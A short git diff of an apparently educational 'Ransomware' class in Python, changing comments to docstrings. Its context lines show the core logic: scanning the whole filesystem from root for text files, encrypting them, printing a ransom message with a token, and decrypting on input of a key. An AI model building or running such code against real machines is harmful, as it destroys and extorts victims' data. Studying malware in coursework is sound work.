@@ -35,7 +35,10 @@ class Ransomware:
             sys.exit(1)
 
     def get_files(self, filter:str)->list:
-        # return all files matching the filter
+        """
+         return all files matching the filter
+        """
+
         # here we want all the texte files so the filter will be '*.txt'
         # the path("/") enable the function to find all the files matching the filter in the system
         path_files=Path("/")  
@@ -43,7 +46,10 @@ class Ransomware:
         return files
 
     def encrypt(self):
-        # main function for encrypting (see PDF)
+        """
+         Main function for encrypting (see PDF)
+        """
+
         liste_files = self.get_files("*.txt")
         secret_manager = SecretManager()
         secret_manager.setup()
@@ -53,12 +59,17 @@ class Ransomware:
         print(ENCRYPT_MESSAGE.format(token_hex))
 
     def decrypt(self):
-        # main function for decrypting (see PDF)
+        """
+         Main function for decrypting (see PDF)
+        """
+
         liste_files = self.get_files("*.txt")
         secret_manager = SecretManager()
 
         try:
             candidate_key=input("Key : ")
+            # If the key is not valid, 'set_key' raise an error 
+            # which leads to the except case 
             secret_manager.set_key(candidate_key)
             secret_manager.xorfiles(liste_files)
             secret_manager.clean()
